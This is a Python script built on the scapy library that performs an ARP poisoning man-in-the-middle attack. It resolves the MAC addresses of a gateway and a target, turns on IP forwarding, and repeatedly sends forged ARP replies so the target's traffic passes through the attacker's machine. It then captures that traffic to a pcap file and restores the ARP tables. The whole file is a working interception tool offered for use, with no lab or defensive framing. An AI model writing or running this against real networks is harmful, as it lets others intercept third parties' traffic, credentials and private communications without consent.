from scapy.all import *
import os
import signal
import sys
import threading
import time

#ARP Poison parameters
print('Usage: python3 arp_poison.py [gateway_ip] [target_ip] [packet_count] [iface]')
gateway_ip = str(sys.argv[1])
target_ip = str(sys.argv[2])
packet_count = str(sys.argv[3])
conf.iface = str(sys.argv[4])
conf.verb = 0

def get_mac(ip_addr):
	resp, unans = sr(ARP(op=1, hwdst='ff:ff:ff:ff:ff:ff', pdst=ip_addr), retry=2, timeout=10)
	for s,r in resp:
		return r[ARP].hwsrc
	return None

def restore_network(gateway_ip, gateway_mac, target_ip, target_mac):
	send(ARP(op=2, hwdst='ff:ff:ff:ff:ff:ff', pdst=gateway_ip, hwsrc=target_mac, psrc=target_ip), count=5)
	send(ARP(op=2, hwdst='ff:ff:ff:ff:ff:ff', pdst=target_ip, hwsrc=gateway_mac, psrc=gateway_ip), count=5)
	print('[*] Disabling IP Forwarding')
	os.system('sysctl -w net.inet.ip.forwarding=0')
	os.kill(os.getpid(), signal.SIGTERM)

def arp_poison(gateway_ip, gateway_mac, target_ip, target_mac):
	print('[*] Started ARP poison attack [CTRL-C to stop]')
	try:
		while True:
			send(ARP(op=2, pdst=gateway_ip, hwdst=gateway_mac, psrc=target_ip))
			send(ARP(op=2, pdst=target_ip, hwdst=target_mac, psrc=gateway_ip))
			time.sleep(2)
	except KeyboardInterrupt:
		print('[*] ARP poison stopped. Restoring tables')
		restore_network(gateway_ip, gateway_mac, target_ip, target_mac)

# STARTING ATTACK
print('[*] Starting script...')
print('[*] Enabling IP forwarding')
os.system('sysctl -w net.inet.ip.forwarding=1')
print(f'[*] Gateway IP address: {gateway_ip}')
print(f'[*] Target IP address: {target_ip}')

gateway_mac = get_mac(gateway_ip)
if gateway_mac is None:
	print('[!] Unable to get gateway MAC... Exiting')
	sys.exit(0)
else:
	print(f'[*] Gateway MAC: {gateway_mac}')

target_mac = get_mac(target_ip)
if target_mac is None:
	print('[!] Unable to get target MAC... Exiting')
	sys.exit(0)
else:
	print(f'[*] Target MAC: {target_mac}')

poison_thread = threading.Thread(target=arp_poison, args=(gateway_ip, gateway_mac, target_ip, target_mac))
poison_thread.start()

try:
	sniff_filter = 'ip host ' + target_ip
	print(f'[*] Starting network capture. Packet count: {packet_count}. FIlter: {sniff_filter}')
	packets = sniff(filter=sniff_filter, iface=conf.iface, count=packet_count)
	wrpcap(target_ip + '_capture.pcap', packets)
	print(f'[*] Stopping network capture... Restoring network')
	restore_network(gateway_ip, gateway_mac, target_ip, target_mac)
except KeyboardInterrupt:
	print(f'[*] Stopping network capture... Restoring network')
	restore_network(gateway_ip, gateway_mac, target_ip, target_mac)
	sys.exit(0)